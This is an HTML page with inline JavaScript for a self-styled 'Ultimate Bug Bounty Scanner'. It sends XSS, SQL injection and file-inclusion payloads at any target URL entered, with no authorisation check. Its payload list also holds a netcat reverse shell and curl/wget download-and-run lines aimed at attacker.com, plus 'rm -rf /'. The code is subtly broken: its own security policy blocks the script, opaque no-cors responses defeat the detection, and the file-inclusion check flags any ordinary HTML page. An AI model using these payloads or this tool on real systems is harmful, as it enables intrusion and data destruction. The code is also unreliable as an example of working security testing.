<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src *">
    <title>🔥 WebSecCheck Pro MAX | Ultimate Bug Bounty Scanner</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2563eb;
            --danger: #dc2626;
            --warning: #d97706;
            --success: #16a34a;
            --dark: #1e293b;
            --light: #f8fafc;
            --hacker: #00ff00;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background-color: #0a0a0a;
            color: #e0e0e0;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 1rem;
        }
        
        header {
            background: #111;
            border-bottom: 1px solid #333;
            padding: 1rem 0;
            margin-bottom: 2rem;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--hacker);
            text-decoration: none;
        }
        
        .scanner-card {
            background: #111;
            border: 1px solid #333;
            border-radius: 0;
            padding: 2rem;
            margin-bottom: 3rem;
        }
        
        .input-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
        }
        
        .input-group input {
            flex: 1;
            padding: 1rem;
            background: #222;
            border: 1px solid #444;
            color: white;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            padding: 1rem 2rem;
            background: var(--primary);
            color: white;
            border: none;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.2s;
        }
        
        .btn:hover {
            background: #1a4bbb;
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .loading {
            text-align: center;
            padding: 3rem 0;
            display: none;
        }
        
        .scan-result {
            display: none;
            margin-top: 2rem;
            animation: fadeIn 0.3s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .vulnerability-item {
            background: #1a1a1a;
            border-left: 4px solid var(--danger);
            padding: 1.5rem;
            margin-bottom: 1rem;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        
        .vulnerability-item:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .vulnerability-item.critical {
            border-left-color: var(--danger);
        }
        
        .vulnerability-item.high {
            border-left-color: var(--warning);
        }
        
        .vulnerability-item.medium {
            border-left-color: #ffcc00;
        }
        
        .severity {
            display: inline-block;
            padding: 0.3rem 0.6rem;
            background: #333;
            color: white;
            font-weight: bold;
            font-size: 0.8rem;
            border-radius: 3px;
        }
        
        .severity.critical {
            background: var(--danger);
        }
        
        .severity.high {
            background: var(--warning);
        }
        
        .severity.medium {
            background: #ffcc00;
            color: #000;
        }
        
        .report-content {
            background: #111;
            border: 1px solid #333;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        
        #scanProgress {
            color: var(--hacker);
            margin-top: 1rem;
        }
        
        .progress-bar {
            width: 100%;
            background: #333;
            height: 8px;
            margin-top: 1rem;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: var(--primary);
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <i class="fas fa-shield-alt"></i>
                <span>WebSecCheck Pro MAX</span>
            </div>
        </div>
    </header>
    
    <main class="container">
        <div class="scanner-card">
            <h1><i class="fas fa-terminal"></i> Ultimate Vulnerability Scanner</h1>
            <p>Advanced security scanner for bug bounty hunters and pentesters</p>
            
            <div class="input-group">
                <input type="url" id="scanUrl" placeholder="https://target.com" required>
                <button class="btn" id="scanButton">
                    <i class="fas fa-bolt"></i> Deep Scan
                </button>
            </div>
            
            <div class="loading" id="loadingIndicator">
                <h3><i class="fas fa-spinner fa-spin"></i> Scanning Target</h3>
                <div id="scanProgress">Initializing scanner engine...</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
            
            <div class="scan-result" id="scanResult">
                <h2><i class="fas fa-clipboard-list"></i> Scan Results</h2>
                <div id="vulnerabilityList"></div>
                
                <h3><i class="fas fa-file-alt"></i> Full Report</h3>
                <pre class="report-content" id="reportContent"></pre>
                
                <button class="btn" id="exportButton">
                    <i class="fas fa-file-export"></i> Export Report
                </button>
            </div>
        </div>
    </main>

    <script>
        // ======================
        // ENHANCED SCANNER ENGINE
        // ======================
        
        // Optimized payload database with more advanced vectors
        const payloads = {
            xss: [
                '"><svg/onload=console.log(`XSS_${document.domain}`)>',
                'javascript:alert(document.domain)',
                '{{constructor.constructor("alert(1)")()}}',
                '<img src=x onerror=alert(window.origin)>',
                '"><iframe src=javascript:alert(1)>'
            ],
            sqli: [
                "' OR 1=1-- -",
                "admin' AND 1=CONVERT(int,@@version)--",
                "1' UNION SELECT username,password FROM users--",
                "' OR SLEEP(5)--"
            ],
            lfi: [
                "../../../../etc/passwd%00",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd"
            ],
            rce: [
                "|curl http://attacker.com/exploit",
                ";nc -e /bin/sh attacker.com 4444",
                "`wget http://attacker.com/shell.sh -O- | sh`",
                "$(rm -rf /)"
            ]
        };

        // Scanner configuration
        const config = {
            maxConcurrentRequests: 5,
            requestTimeout: 10000,
            scanDelay: 300
        };

        // Scanner state
        const state = {
            activeRequests: 0,
            queuedRequests: 0,
            scanAborted: false
        };

        // ======================
        // CORE SCANNER FUNCTIONS
        // ======================

        /**
         * Main scan initiation function
         */
        async function startScan() {
            const url = document.getElementById('scanUrl').value.trim();
            
            // Validate input
            if (!url) {
                showAlert("Please enter a target URL", "error");
                return;
            }
            
            if (!isValidUrl(url)) {
                showAlert("Invalid URL format. Please include http:// or https://", "error");
                return;
            }
            
            if (isSelfScan(url)) {
                showAlert("Self-scanning is not allowed for security reasons", "error");
                return;
            }
            
            try {
                // Reset state
                resetScannerState();
                
                // UI setup
                prepareScanUI();
                
                // Run vulnerability tests
                const results = await runAllVulnerabilityTests(url);
                
                // Process and display results
                processScanResults(results);
                
            } catch (error) {
                handleScanError(error);
            } finally {
                completeScan();
            }
        }

        /**
         * Run all vulnerability tests
         */
        async function runAllVulnerabilityTests(url) {
            const results = [];
            const testQueue = [
                { type: "XSS", func: testXSS },
                { type: "SQLi", func: testSQLi },
                { type: "LFI", func: testLFI }
            ];
            
            // Run tests in sequence with progress updates
            for (const test of testQueue) {
                if (state.scanAborted) break;
                
                updateStatus(`Running ${test.type} tests...`);
                const testResults = await test.func(url);
                results.push(...testResults);
                
                // Update progress
                updateProgressBar((testQueue.indexOf(test) + 1) * 30);
                await delay(config.scanDelay);
            }
            
            return results;
        }

        // ======================
        // VULNERABILITY TESTERS
        // ======================

        /**
         * XSS Testing with advanced detection
         */
        async function testXSS(url) {
            const results = [];
            const testUrls = payloads.xss.map(payload => ({
                url: `${url}?test=${encodeURIComponent(payload)}`,
                payload
            }));
            
            for (const test of testUrls) {
                if (state.scanAborted) break;
                
                try {
                    const response = await fetchWithTimeout(test.url, {
                        mode: 'no-cors',
                        credentials: 'omit'
                    }, config.requestTimeout);
                    
                    const text = await response.text();
                    
                    if (text.includes(test.payload)) {
                        results.push({
                            type: "XSS",
                            payload: test.payload,
                            severity: "high",
                            description: "Reflected XSS vulnerability detected",
                            proof: test.url
                        });
                    }
                } catch (error) {
                    console.error(`XSS test failed for ${test.payload}:`, error);
                }
                
                updateProgressDetails(`Testing XSS payload: ${test.payload.substring(0, 20)}...`);
            }
            
            return results;
        }

        /**
         * SQL Injection Testing
         */
        async function testSQLi(url) {
            const results = [];
            const testUrls = payloads.sqli.map(payload => ({
                url: `${url}/login?username=${encodeURIComponent(payload)}&password=test`,
                payload
            }));
            
            for (const test of testUrls) {
                if (state.scanAborted) break;
                
                try {
                    const startTime = Date.now();
                    const response = await fetchWithTimeout(test.url, {
                        mode: 'no-cors',
                        credentials: 'omit'
                    }, config.requestTimeout);
                    
                    const responseTime = Date.now() - startTime;
                    
                    // Time-based detection
                    if (responseTime > 3000) {
                        results.push({
                            type: "SQLi",
                            payload: test.payload,
                            severity: "critical",
                            description: "Potential time-based SQL injection",
                            proof: test.url
                        });
                    }
                    // Error-based detection
                    else if (!response.ok && response.status !== 403) {
                        results.push({
                            type: "SQLi",
                            payload: test.payload,
                            severity: "critical",
                            description: "Potential error-based SQL injection",
                            proof: test.url
                        });
                    }
                    
                    updateProgressDetails(`Testing SQLi payload: ${test.payload.substring(0, 20)}...`);
                } catch (error) {
                    console.error(`SQLi test failed for ${test.payload}:`, error);
                }
            }
            
            return results;
        }

        /**
         * Local File Inclusion Testing
         */
        async function testLFI(url) {
            const results = [];
            const testUrls = payloads.lfi.map(payload => ({
                url: `${url}/file?path=${encodeURIComponent(payload)}`,
                payload
            }));
            
            for (const test of testUrls) {
                if (state.scanAborted) break;
                
                try {
                    const response = await fetchWithTimeout(test.url, {
                        mode: 'no-cors',
                        credentials: 'omit'
                    }, config.requestTimeout);
                    
                    const text = await response.text();
                    
                    if (text.includes('root:') || text.includes('<?php') || text.includes('DOCTYPE html')) {
                        results.push({
                            type: "LFI",
                            payload: test.payload,
                            severity: "critical",
                            description: "Potential Local File Inclusion vulnerability",
                            proof: test.url
                        });
                    }
                    
                    updateProgressDetails(`Testing LFI payload: ${test.payload.substring(0, 20)}...`);
                } catch (error) {
                    console.error(`LFI test failed for ${test.payload}:`, error);
                }
            }
            
            return results;
        }

        // ======================
        // UTILITY FUNCTIONS
        // ======================

        /**
         * Fetch with timeout
         */
        function fetchWithTimeout(url, options, timeout) {
            return Promise.race([
                fetch(url, options),
                new Promise((_, reject) =>
                    setTimeout(() => reject(new Error('Request timeout')), timeout)
                )
            ]);
        }

        /**
         * Validate URL format
         */
        function isValidUrl(url) {
            try {
                new URL(url);
                return true;
            } catch {
                return false;
            }
        }

        /**
         * Check for self-scan attempts
         */
        function isSelfScan(url) {
            try {
                const target = new URL(url);
                const current = new URL(window.location.href);
                return target.hostname === current.hostname;
            } catch {
                return false;
            }
        }

        /**
         * Delay function
         */
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ======================
        // UI FUNCTIONS
        // ======================

        /**
         * Prepare UI for scanning
         */
        function prepareScanUI() {
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('scanResult').style.display = 'none';
            document.getElementById('vulnerabilityList').innerHTML = '';
            document.getElementById('reportContent').textContent = '';
            state.scanAborted = false;
        }

        /**
         * Update scan progress status
         */
        function updateStatus(message) {
            document.getElementById('scanProgress').textContent = message;
        }

        /**
         * Update detailed progress information
         */
        function updateProgressDetails(details) {
            const progressElement = document.getElementById('scanProgress');
            progressElement.innerHTML += `<br><small>${details}</small>`;
            progressElement.scrollTop = progressElement.scrollHeight;
        }

        /**
         * Update progress bar
         */
        function updateProgressBar(percent) {
            document.getElementById('progressFill').style.width = `${percent}%`;
        }

        /**
         * Process and display scan results
         */
        function processScanResults(results) {
            const container = document.getElementById('vulnerabilityList');
            
            if (!results || results.length === 0) {
                container.innerHTML = `
                    <div class="vulnerability-item safe">
                        <h3><i class="fas fa-check-circle"></i> No Critical Vulnerabilities Found</h3>
                        <p>The scanner did not find any critical security issues.</p>
                    </div>
                `;
            } else {
                // Group by vulnerability type
                const groupedResults = results.reduce((groups, item) => {
                    const group = groups[item.type] || [];
                    group.push(item);
                    groups[item.type] = group;
                    return groups;
                }, {});
                
                // Display grouped results
                for (const [type, items] of Object.entries(groupedResults)) {
                    const typeHeader = document.createElement('h3');
                    typeHeader.textContent = `${type} Vulnerabilities (${items.length})`;
                    container.appendChild(typeHeader);
                    
                    items.forEach(vuln => {
                        const vulnElement = document.createElement('div');
                        vulnElement.className = `vulnerability-item ${vuln.severity}`;
                        vulnElement.innerHTML = `
                            <h4>
                                <i class="fas fa-bug"></i>
                                ${vuln.description}
                                <span class="severity ${vuln.severity}">${vuln.severity.toUpperCase()}</span>
                            </h4>
                            <p><strong>Payload:</strong> <code>${escapeHtml(vuln.payload)}</code></p>
                            <p><strong>Proof:</strong> <a href="${vuln.proof}" target="_blank">${vuln.proof.substring(0, 50)}...</a></p>
                            <div class="vulnerability-details">
                                <button class="btn small" onclick="copyToClipboard('${escapeHtml(vuln.payload)}')">
                                    <i class="fas fa-copy"></i> Copy Payload
                                </button>
                            </div>
                        `;
                        container.appendChild(vulnElement);
                    });
                }
            }
            
            // Generate full report
            generateFullReport(results);
            
            // Show results section
            document.getElementById('scanResult').style.display = 'block';
        }

        /**
         * Generate comprehensive report
         */
        function generateFullReport(results) {
            let report = `=== WEB SECURITY SCAN REPORT ===\n\n`;
            report += `Scan Date: ${new Date().toLocaleString()}\n`;
            report += `Scan Target: ${document.getElementById('scanUrl').value}\n\n`;
            
            if (results.length === 0) {
                report += `No critical vulnerabilities found.\n`;
                report += `Note: This scan tested for XSS, SQLi, and LFI vulnerabilities.\n`;
            } else {
                report += `VULNERABILITIES FOUND: ${results.length}\n\n`;
                
                const grouped = results.reduce((groups, item) => {
                    const group = groups[item.type] || [];
                    group.push(item);
                    groups[item.type] = group;
                    return groups;
                }, {});
                
                for (const [type, items] of Object.entries(grouped)) {
                    report += `=== ${type.toUpperCase()} (${items.length}) ===\n\n`;
                    
                    items.forEach((item, i) => {
                        report += `[${i+1}] Severity: ${item.severity.toUpperCase()}\n`;
                        report += `Description: ${item.description}\n`;
                        report += `Payload: ${item.payload}\n`;
                        report += `Proof URL: ${item.proof}\n\n`;
                    });
                }
                
                report += `RECOMMENDATIONS:\n`;
                report += `1. Patch critical vulnerabilities immediately\n`;
                report += `2. Implement input validation and output encoding\n`;
                report += `3. Configure proper server security headers\n`;
            }
            
            report += `\nGenerated by WebSecCheck Pro MAX\n`;
            document.getElementById('reportContent').textContent = report;
        }

        /**
         * Show alert message
         */
        function showAlert(message, type = "info") {
            alert(`[${type.toUpperCase()}] ${message}`);
        }

        /**
         * Handle scan errors
         */
        function handleScanError(error) {
            console.error("Scan error:", error);
            showAlert(`Scan failed: ${error.message}`, "error");
            state.scanAborted = true;
        }

        /**
         * Complete scan process
         */
        function completeScan() {
            document.getElementById('loadingIndicator').style.display = 'none';
            updateProgressBar(100);
            updateStatus(state.scanAborted ? "Scan aborted" : "Scan completed");
        }

        /**
         * Reset scanner state
         */
        function resetScannerState() {
            state.activeRequests = 0;
            state.queuedRequests = 0;
            state.scanAborted = false;
        }

        /**
         * Escape HTML for safe output
         */
        function escapeHtml(unsafe) {
            return unsafe.toString()
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        /**
         * Copy text to clipboard
         */
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text)
                .then(() => showAlert("Payload copied to clipboard", "success"))
                .catch(err => showAlert("Failed to copy: " + err, "error"));
        }

        // ======================
        // EVENT LISTENERS
        // ======================

        document.getElementById('scanButton').addEventListener('click', startScan);
        
        document.getElementById('exportButton').addEventListener('click', () => {
            const report = document.getElementById('reportContent').textContent;
            const blob = new Blob([report], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `security_scan_${new Date().toISOString().slice(0,10)}.txt`;
            a.click();
            
            URL.revokeObjectURL(url);
            showAlert("Report exported successfully", "success");
        });

        // Initialize scanner
        document.addEventListener('DOMContentLoaded', () => {
            console.log("WebSecCheck Pro MAX initialized");
            updateStatus("Ready to scan");
        });
    </script>
</body>
</html>
